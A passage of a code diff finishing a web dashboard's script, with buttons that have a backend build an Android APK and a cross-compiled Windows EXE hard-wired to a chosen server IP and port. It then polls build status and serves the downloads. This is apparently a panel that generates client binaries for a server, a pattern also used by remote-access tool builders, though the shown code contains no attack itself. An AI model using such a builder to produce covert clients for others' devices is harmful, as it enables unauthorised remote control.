+  const res = await fetch('/api/generate_apk', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({ip, port:parseInt(port)})});
+  const j = await res.json();
+  if (j.error) {
+    document.getElementById('buildStatus').className = 'build-info err';
+    document.getElementById('buildStatus').textContent = j.error;
+    document.getElementById('buildBtn').disabled = false;
+  }
+}
+
+async function checkBuild() {
+  if (!document.getElementById('buildBtn').disabled) return;
+  try {
+    const res = await fetch('/api/build_status');
+    const s = await res.json();
+    if (s.building) {
+      document.getElementById('buildStatus').innerHTML = '<span class="spinner"></span> Building for ' + esc(s.last_ip) + '...';
+    } else if (s.last_error) {
+      document.getElementById('buildStatus').className = 'build-info err';
+      document.getElementById('buildStatus').textContent = 'Failed: ' + s.last_error.substring(0, 300);
+      document.getElementById('buildBtn').disabled = false;
+    } else {
+      document.getElementById('buildStatus').className = 'build-info ok';
+      document.getElementById('buildStatus').textContent = '✅ APK ready for ' + s.last_ip;
+      document.getElementById('downloadBtn').style.display = 'block';
+      document.getElementById('buildBtn').disabled = false;
+    }
+  } catch(e) {}
+}
+
+function downloadApk() { window.location.href = '/api/download_apk'; }
+
+/* ---- EXE Generator ---- */
+async function generateExe() {
+  const ip = document.getElementById('exeIp').value.trim();
+  const port = document.getElementById('exePort').value.trim() || '9090';
+  if (!ip) { alert('Enter a server IP'); return; }
+  document.getElementById('exeBuildBtn').disabled = true;
+  document.getElementById('exeBuildStatus').className = 'build-info';
+  document.getElementById('exeBuildStatus').innerHTML = '<span class="spinner"></span> Cross-compiling...';
+  document.getElementById('exeDownloadBtn').style.display = 'none';
+  try {
+    const res = await fetch('/api/generate_exe', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({ip, port:parseInt(port)})});
+    const j = await res.json();
+    if (j.error) {
+      document.getElementById('exeBuildStatus').className = 'build-info err';
+      document.getElementById('exeBuildStatus').textContent = j.error;
+      document.getElementById('exeBuildBtn').disabled = false;
+    }
+  } catch(e) {
+    document.getElementById('exeBuildStatus').className = 'build-info err';
+    document.getElementById('exeBuildStatus').textContent = 'Request failed';
+    document.getElementById('exeBuildBtn').disabled = false;
+  }
+}
+
+async function checkExeBuild() {
+  if (!document.getElementById('exeBuildBtn').disabled) return;
+  try {
+    const res = await fetch('/api/exe_build_status');
+    const s = await res.json();
+    if (s.building) {
+      document.getElementById('exeBuildStatus').innerHTML = '<span class="spinner"></span> Compiling for ' + esc(s.last_ip) + '...';
+    } else if (s.last_error) {
+      document.getElementById('exeBuildStatus').className = 'build-info err';
+      document.getElementById('exeBuildStatus').textContent = 'Failed: ' + s.last_error.substring(0, 300);
+      document.getElementById('exeBuildBtn').disabled = false;
+    } else if (s.available) {
+      document.getElementById('exeBuildStatus').className = 'build-info ok';
+      document.getElementById('exeBuildStatus').textContent = '✅ EXE ready (' + (s.size/1024).toFixed(0) + ' KB) for ' + s.last_ip;
+      document.getElementById('exeDownloadBtn').style.display = 'block';
+      document.getElementById('exeBuildBtn').disabled = false;
+    }
+  } catch(e) {}
+}
+
+function downloadExe() { window.location.href = '/api/download_exe'; }
+
+startRefresh();
+</script>
+</body>
+</html>
